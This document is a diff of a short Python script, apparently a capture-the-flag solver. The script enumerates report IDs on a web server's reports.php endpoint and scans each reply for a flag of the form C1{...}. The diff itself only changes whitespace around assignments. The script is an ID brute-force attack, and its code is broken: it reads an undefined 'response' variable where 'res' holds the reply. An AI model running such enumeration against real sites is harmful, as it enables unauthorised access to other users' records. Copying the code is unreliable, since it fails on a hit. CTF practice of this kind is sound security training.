@@ -46,17 +46,17 @@ g=1e5 - p - 1
 for n in altgen(p, g):
     url=f'http://{ip}/reports.php?id={n}&code=UV12WX/'
     try:
-        res = requests.get(url, timeout=w)
+        res=requests.get(url, timeout=w)
     except requests.RequestException:
         print(f'Not found: {n}')
         time.sleep(w)
         continue
     if res.status_code == 200:
-        c = response.text
+        c=response.text
         print(f"\n=== found: {n} ===")
         #print(c) #use as necessary
-        match = re.search(r'C1\{.*?\}', c)
-        flag = match.group(0) if match else None
+        match=re.search(r'C1\{.*?\}', c)
+        flag=match.group(0) if match else None
         if flag:
             print(f"\n=== flag found at {n}: {flag} ===")
             break
